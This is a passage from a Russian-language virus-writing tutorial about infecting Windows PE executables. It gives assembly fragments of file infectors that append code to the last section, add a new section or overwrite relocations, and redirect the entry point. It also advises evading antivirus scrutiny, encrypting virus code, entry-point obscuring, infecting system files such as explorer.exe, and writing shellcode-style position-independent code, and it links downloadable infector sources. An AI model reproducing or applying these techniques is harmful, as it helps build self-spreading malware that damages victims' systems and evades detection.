<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Не нулевая ли последняя секция?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pLastSection<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>SizeOfRawData==<span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;последняя секция нулевая</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; Exit<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp;</div>
<p>После этих действий записываем код и правим некоторые значения. Какие значения править было описано в алгоритме выше.</p>
<p>При внедрении заметьте, что мы добавляем данные в конец последней секции. Т.е. мы не используем место оставшееся в результате файлового выравнивания. Учитывая этот факт, новая точка входа будет равна RVA секции + SizeOfRawData до заражения. Также как и в прошлом примере в код добавляется переход на старую точку входа. Правка точки входа достигается следующим кодом:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Правка AddressOfEntryPoint</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pLastSection<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>VirtualAddress<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>SizeOfRawData<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pOptionalHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_OPTIONAL_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>AddressOfEntryPoint<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp;</div>
<p>Загрузчик проверяет выполнение равенства ImageSize=VirtualSize+VirtualAddress. Из-за этого мы должны изменить ImageSize:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pLastSection<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Misc<span style="color: #339933;">.</span>VirtualSize<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>VirtualAddress<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pOptionalHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_OPTIONAL_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>SizeOfImage<span style="color: black; font-style: italic;">;Правка ImageSize</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp;</div>
<p>В результате заражения размер файла увеличивается. Это может вызвать подозрения. Используя данный метод заражения можно внедрить код любого размера. Также можно заразить файл бесконечное количество раз и он будет работать. У меня был notepad.exe, который занимал 30 Мб. Он был просто заражен много раз. Полезная нагрузка (внедряемый код) занимала ~3Мб. Но notepad.exe запускался после повторения некоторых действий.</p>
<h3><a name="c2af"></a>Cпособ 3. Добавление новой секции</h3>
<p>Теперь давайте сами добавим новую секцию в PE-файл. Алгоритм добавления новой секции выглядит так:</p>
<ol>
	<li>Если есть Bound-импорты, то удалить их.</li>
	<li>Найти конец таблицы секций.</li>
	<li>Добавить запись о своей секции в таблицу секций.</li>
	<li>Обновить соответствующие поля.</li>
	<li>Записать код по нужному файловому смещению.</li>
	<li>Правим точку входа.</li>
	<li>Правим размер образа - ImageSize=VirtualSize+VirtualAddress</li>
	<li>Правим NumberOfSections</li>
</ol>
<h3><a name="c2ag"></a>Код инфектора</h3>
<p>Размер нового файла вычисляется по такой же формуле что и в предыдущем способе. Первым делом в программе как раз вычисляется новый размер файла. После этого опять ищем Bound-импорты, которые могут находится сразу после оригинальной таблицы секций. Затираем запись о Bound-импортах в таблице директорий. После окончания оригинальной таблицы секций забиваем нулями 40 байт - это будет наше место для новой записи в таблице секций. Хорошо, место есть. Теперь надо создать запись о новой секции и внести туда правильные данные. Чтобы выяснить какие данные нужны, посмотрите на структуру IMAGE_SECTION_HEADER. Имя секции выбираем любое. Главное чтобы оно укладывалось в 8 байт. Я назвал свою секцию .new. Еще один способ проверки не заражен ли уже файл - это проверка названия последней секции. VirtualSize - это размер нашего вредного кода. Чтобы посчитать виртуальный адрес новой секции надо взять виртуальный адрес последней секции. Потом взять размер в файле этой секции. Сложить полученные данные и выровнять их по SectionAlignment. Для получения значения SectionAlignment используется процедура GetSectionAlignment. Код:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Получаем информацию для новой секции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pLastSection<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>VirtualAddress<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>SizeOfRawData<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; hFile<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; CloseHandle<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>ofn<span style="color: #339933;">.</span>lpstrFile<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetSectionAlignment<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetAlignUp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;eax - Виртуальный адрес новой секции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp;</div>
<p>SizeOfRawData - берем значение виртуального размера и выравниванием на FileAlignment. Для получения значения FileAlignment используется процедура GetFileAlignment. PointerToRawData будет соответствовать старому размеру файла, т.е. данные для секции добавляются в хвост. Далее все оставляем, кроме характеристик. Как выставлять характеристики нам известно. После создания записи о новой секции внедряем код в конец файла. Потом правим AddressOfEntryPoint, ImageSize. И не забудьте подправить NumberOfSections, а то лоадер начнет ругаться что-то там про win32. Вот как я делаю это:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Правка Number Of Section</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pFileHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_FILE_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>NumberOfSections<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span>&lt;<span style="color: #339933;">/</span>p&gt;<br />
&nbsp;</div>
<p>Я не проверяю ошибки, так что сделайте так чтобы файлы, которые Вы открываете, были валидны. В этом инфекторе не также проверки на зараженность, чтобы показать что файл можно заражать несколько раз. В результате заражения размер файла увеличивается. Можно заражать несколько раз, но не бесконечное число. Количество зависит от места конца таблицы секций до данных первой физической секции. Если вдруг антивирус обращет внимание, что точка входа стоит на последней секции, то создайте две секции. На первую из них будет указывать AddressOfEntryPoint. Тогда подозрение по данному признаку исчезнут.</p>
<h3><a name="c2ah"></a>Способ 4. Удаление базовых поправок</h3>
<p>В некоторых PE-файлах присутствуют базовые поправки. Вы уже знаете, что это такое, если читали с начала главу. Так вот они в большинстве случаев для EXE-файла не обязательны. Линкеры по умолчанию не создают базовых поправок в PE-файле в целях оптимизации. Мы можем использовать место, отведенное для базовых поправок, для внедрения кода. Чаще всего для базовых поправок отведена отдельная секция, которая называется .reloc. Но эти данные могут и не иметь отдельной секции. Чтобы узнать, где действительно распологается базовые поправки необходимо обратиться к таблице директорий. При заражении мы должны вынудить заргрузчик не использовать базовые поправки для данного EXE-файла. Для этого требутся всего лишь обнулить запись о базовых поправках в таблице директорий. Алгоритм замены секции базовых поправок выглядит так:</p>
<ol>
	<li>В таблице директорий удалить запись о базовых поправках.</li>
	<li>Записать код на это место.</li>
	<li>Изменить AddressOfEntryPoint</li>
</ol>
<p>Это все! Никаких ImageSize и т.д. не нужно править т.к. мы не изменяем размер файла.</p>
<h3><a name="c2ai"></a>Полезная нагрузка(payload)</h3>
<p>Теперь вы знаете, как внедряться в исполняемый файл. Код, который будет внедрен должен быть базонезависимым. Что обеспечить это условие необходимо использовать дельта смещение и связанные с ним техники. О дельта смещении вы должны были узнать в 1 главе. Код, который здесь приводился базозависим. Это сделано для большего понимания приводимого материала. Но если вы читали главу 1, то для Вас не составит труда сделать код базонезависимым. Также можно использовать термин - код в шел-код стиле.</p>
<h3><a name="c2aj"></a>Продвинутые приемы при заражении PE-файлов</h3>
<p>Один из продвинутых приемов при заражении файлов является модификация кодапрограммы. Это довольно сложно. Неоходимо анализировать код программы и выискивать оттуда пустые места или инструкции, которые можно заменить. Если мы просто заразили файл и точку входа изменили на наш код, то это сразу вызвет подозрения, даже визульно. Хороший инфектор должен быть практически невидим, т.е. не отличаться от кода программы. Вы можете размазывать весь код вируса по всему PE-файлу. Куда его засовывать? Да очень просто. У каждой секции есть файловое выравнивание. Следовательно остается свободное место в конце каждой физической секции. Когда в одной секции место закончилось ставьте jmp на следующий кусок кода и так далее. При модификации кода необходимо сохранять старые байты команд, т.е. например не переписать случайно половину команды. В этом случае помогает дизассемблер в вирусе специально написанный Вами. О дизассемлере в вирусах и его использовании я буду говорить в соответствующей главе. Эта тема требут отдельного разговора и называется EPO (EPO: Entry Point Obscuring). При модификации кода, часто необходимо учитывать базовые поправки. Если вдруг Вы попытались заразить DLL, а ей базовые поправки нужны очень часто, то Вы должны позаботиться при модификации кода о прапатчивании модифицированных элементов. Так или иначе Microsoft приподнесла нам подарок в виде файлового выравнивания. Мы можем как угодно использовать это свободное место. Еще один способ для получения свободного места - сжатие оригинального кода. На его место можно записать наш код. При запуске файла код распаковывается, а вирус попадает на какой-то виртуальный адрес. Можно сделать заражение не использую код в шел-код стиле. Есть исполняемый файл, который является вирусом. Есть жертва. Мы берем исполняемый файл, добавляем все данные файла жертвы в файл вируса. Модифицируем с учетом новых данных вирусный PE-файл. Далее заменяем файл жертву на новый файл. При запуске зараженного файла некоторый код вируса, используя сохраненные данные, создает временный оригинальный файл и запускает его. В итоге запускается оригинальный файл. Сразу же исчезают многие проблему. Но у этого способа есть недостатки. Например, решение о том где хранить оригинальный файл. Если мы будем хранить его в той же папке это сразу можно заметить. Еще один способ заключается в следующем. Мы внедряем код запуска некоторого файла в жертву. При запуске жертвы запускается вредоносный файл, и жертва продолжает работу. Ну, это слишком просто. Тем более будет отображеться новый процесс. Это просто новый способ автозагрузки. Например, если заразить explorer. exe. Можно заразить любой файл из папки Windows. Например, notepad.exe. Это можно осуществить, т.к. WFP(Windows File Protection) побеждена. Я расскажу Вам об этом скоро. Вообще можно придумать куча вещей, неоходимо немного фантазии и знание PE-формата. Кое-что Вы можете почитать из той литературы, которую я Вам предложу ниже.</p>
<h3><a name="c2ak"></a>Источники для дальнейших исследований</h3>
<ol>
	<li>Основные методы заражения PE EXE [Sars/HI-TECH] <a href="http://www.wasm.ru/">wasm.ru</a></li>
	<li>Об упаковщиках в последний раз: Часть 1/2 [Volodya/HI-TECH,NEOx/UINC] <a href="http://www.wasm.ru/">wasm.ru</a></li>
	<li><a href="/lib/aas08.html">Windows NT and Viruses</a> [Alan Solomon] <a href="http://vx.netlux.org/">http://vx.netlux.org</a></li>
	<li><a href="/lib/vbe00.html">MSIL-PE-EXE infection strategies</a> [Benny/29A] <a href="http://vx.netlux.org/">http://vx.netlux.org</a></li>
	<li>ФОРМАТ ИСПОЛНЯЕМЫХ ФАЙЛОВ PortableExecutables (PE) [Hard Wisdom] <a href="http://cracklab.ru/">http://cracklab.ru/</a></li>
	<li><a href="/lib/vgy01.html">EPO: Entry-Point Obscuring</a> [GriYo/29A] <a href="http://vx.netlux.org/">http://vx.netlux.org</a></li>
	<li>An In-Depth Look into the Win32 Portable Executable File Format, Part 1/2 [Matt Pietrek] <a href="http://www.microsoft.com/">http://www.microsoft.com</a></li>
	<li>Путь воина - внедрение в pe/coff файлы [Крис Касперски] <a href="http://www.insidepro.com/">http://www.insidepro.com/</a></li>
	<li><a href="/lib/vjh02.html">PE Infection school</a> [JHB] <a href="http://vx.netlux.org/">http://vx.netlux.org</a></li>
	<li>The PE file format [LUEVELSMEYER] <a href="http://www.cs.bilkent.edu.tr/~hozgur/PE.TXT">http://www.cs.bilkent.edu.tr/~hozgur/PE.TXT</a></li>
	<li>Microsoft Portable Executable and Common Object File Format Specification [Microsoft] <a href="http://www.microsoft.com/">http://www.microsoft.com</a></li>
	<li>PORTABLE EXECUTABLE FORMAT [Micheal J.O'Leary]</li>
	<li><a href="/lib/aek06.html">The Evolution of 32-Bit Windows Viruses</a> [Peter Szor, Eugene Kaspersky] <a href="http://vx.netlux.org/">http://vx.netlux.org</a></li>
	<li>Optimizing DLL Load Time Performance [Matt Pietrek] <a href="http://www.microsoft.com/">http://www.microsoft.com</a></li>
	<li>What Goes On Inside Windows 2000: Solving the Mysteries of the Loader [Russ Osterlund] <a href="http://www.microsoft.com/">http://www.microsoft.com</a></li>
	<li><a href="/lib/vzo08.html">Injected Evil</a> (executable files infection) [Z0mbie/29a]</li>
	<li>Загрузчик PE-файлов[Максим М. Гумеров] <a href="http://www.rsdn.ru/">www.rsdn.ru</a></li>
	<li>Programming Applications for Microsoft Windows [Jeffrey Richter]</li>
	<li>Исследование переносимого формата исполнимых файлов "сверху вниз" [Randy Kath] <a href="http://education.kulichki.net/comp/hack/27.htm">http://education.kulichki.net/comp/hack/27.htm</a>.</li>
	<li>Infectable Objects 1/2/3/4[Robert Vibert] <a href="http://www.secutityfocus.com/">http://www.secutityfocus.com</a></li>
	<li>Ideas and theoryes on PE infection [b0z0/iKx] <a href="http://vx.netlux.org/">http://vx.netlux.org</a></li>
</ol>
<h3><a name="c2al"></a>Резюме</h3>
<p>В этой главе мы рассмотрели формат исполняемых файлов win32. Рассмотрели каждое поле в отдельности и в общем весь формат. Были приведены примеры работы с PE-форматом на С и ассемблере. Мы узнали как заражать PE-файлы. Цель данной статьи - рассказать Вам как устроен PE-формат, расписать некоторые трудности при записи своего кода в посторонний файл. Также Вы должны приобрести гибкость при анализе любого исполняемого файла и создании своих способов внедрения. К статье прилагется исходные коды 3-х инфекторов и дампера PE-формата в 2-х версиях.</p>
<p><a href="files/vbp01/files2.rar">Файлы к статье</a></p>
<h2><a name="c3"></a>Глава 3: Программирование в Shell-код стиле. Важные техники системного программирования: SEH, VEH и API Hooking. Отключение Windows File Protection.</h2>
<h3><a name="c31"></a>Программирование в Shell-код стиле</h3>
<p>Этот раздел является своеобразным обобщением первых двух глав. Прочтя его, Вы сможете уже без особых трудностей писать простые Win32-вирусы. Код в shell-код стиле или как он еще называется - базово-независимый код требует определенных условий при его написании. Основное условие - чтобы код не зависел от адреса загрузки его в адресное пространство процесса-жертвы и от структур данных загрузчика. Надо определить адрес какой-нибудь команды, где она находилась первоначально (т.е. в первом поколении). Это значение будет константой, зашитой в коде. Далее код должен определить, где он находиться в данный момент. Для этого есть несколько способов, которые описывались в 1 главе. Вот это и называется дельта-смещением.</p>
<p>Также мы должны знать адреса функций API, чтобы вирус был мульти-платформенным относительно Windows, т.е. работал во всех ОС Windows, т.к. известно, что адреса API-функций меняются в зависимости от ОС, а также могут поменяться в той же ОС в какой-то конфликтной ситуации, например при конфликте разделов виртуальной памяти. Для получения адресов, нужных нам функций ОС, существует много способов. Основы получения адресов мы рассмотрели. При получении адресов ОС Windows мы выполняем часть работы загрузчика. При загрузке исполняемого файла (PE, DLL, SYS, SCR) в адресное пространство процесса загрузчик заполняет таблицу адресов импорта (Import Address Table) и таблицу адресов экспорта (Export Address Table). При выполнении кода этого исполняемого файла IAT используется, чтобы хранить адреса всех API-функций, которые использует приложение. Таким образом, мы касаемся неявного связывания (implicit linking). Адрес API-функции может и не быть в IAT, его можно получить с помощью функции KERNEL32.DLL!GetProcAddress. Этой функции на вход передается описатель модуля, в котором экспортируется нужная функция и имя нужной функции. KERNEL32.DLL!GetProcAddress просматривает EAT модуля, описатель которого передается ей параметром (а описателем модуля(module handle), как известно является его базовый адрес(base address) в адресном пространстве процесса, в котором он загружен). Даже при неявном связывании ОС вызывает GetProcAddress для заполнения IAT. Мы своим кодом эмулируем процедуру GetProcAddress - не больше не меньше!</p>
<p>В исполняемом файле есть несколько секций, которые имеют свои атрибуты. Например, секция кода не предназначена для записи. Есть секция неинициализированных данных, которая имеет нулевой размер физически, но при загрузке данного исполняемого модуля в память эта секция приобретает материальный характер. Чтобы это было именно так, загрузчик просматривает таблицу секций и если он видит, что данная секция - секция неинициализированных данных, то он выделяет память в адресном пространстве процесса с помощью функций выделения памяти. Наш код находится всегда в одной секции. Чтобы таким же образом использовать виртуальное адресное пространство для своих целей приходиться использовать функции резервирования и выделения памяти в куче или, напрямую, - в виртуальной памяти.</p>
<p>Более того, есть проблема - если ЮЗВЕРЬ (классное слово :) ) посмотрит файл, зараженный нашим кодом, то он визуально сможет найти там чего-нибудь подозрительное. Чтобы этого не случилось приходиться шифровать наш код или строки текста, создавая соответственно, и расшифровщик. Но это естественно не единственное применение шифрования в коде.</p>
<p>Представьте, что у нас есть код обычного приложения подсистемы Win32 на ассемблере. Задача: превратить его в код в Shell-код стиле. Сначала надо все переменные переместить в секцию с кодом и соответственно поставить прыжок на нормальный код, чтобы эти данные не начали выполняться как код. Потом вычислить дельта-смещение. Далее получить адреса всех API-функций. После этого можно превращать обычный код в код в Shell-код стиле, т.е. заменять все смещения - смещениями с учетом дельта-смещения.</p>
<p><strong>Пример:</strong></p>
<p>Первоначальный код:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; MessageBox<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>offset Text1<span style="color: #339933;">,</span>offset Title1<span style="color: #339933;">,</span> MB_OK<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> error<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br />
error<span style="color: #339933;">:</span><br />
&nbsp;</div>
<p>Во-первых, переменные offset Text1, offset Title1 должны находиться в секции кода т.е. там, где находиться код вируса. Из-за этого секцию с таким кодом нужно делать доступным для записи. Во-вторых, offset Text1 - это абсолютный адрес. Допустим, что мы вычислили дельта-смещение и поместили его в регистр EBP. С учетом вычисленного дельта-смещения мы должны его исправить т.о.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span> offset Text1<span style="color: black;">&#93;</span></div>
<p>Теперь в EDI находиться реальный адрес строки Text1. Также делаем и со всеми остальными переменными. Допустим, что адрес функции MessageBox, находиться в переменной _MessageBox. Тогда вызываем функцию так:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; MB_OK<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span> offset Title1<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span> offset Text1<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>_MessageBox<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp;</div>
<p>Две строки</p>
<src lamg="asm">
	mov	eax,[ebp+_MessageBox]
	call	eax
</src>
<p>можно заменить одной</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>_MessageBox<span style="color: black;">&#93;</span></div>
<p>Пример Закончен.</p>
<p>Как известно система команд современных 32-х разрядных процессоров не содержит в себе дальнего условного перехода. Но у нас код и данные расположены в одном большом сегменте, т.о. мы можем переходить на любые расстояния, используя модель памяти FLAT. Но нет команды, которая осуществляет косвенный переход. Т.е., если у нас адрес хранится в каком-нибудь регистре, то мы не можем использовать команду условного перехода, например так - jne EDI. Вот как можно реализовать косвенный переход</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; Next<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br />
Next<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br />
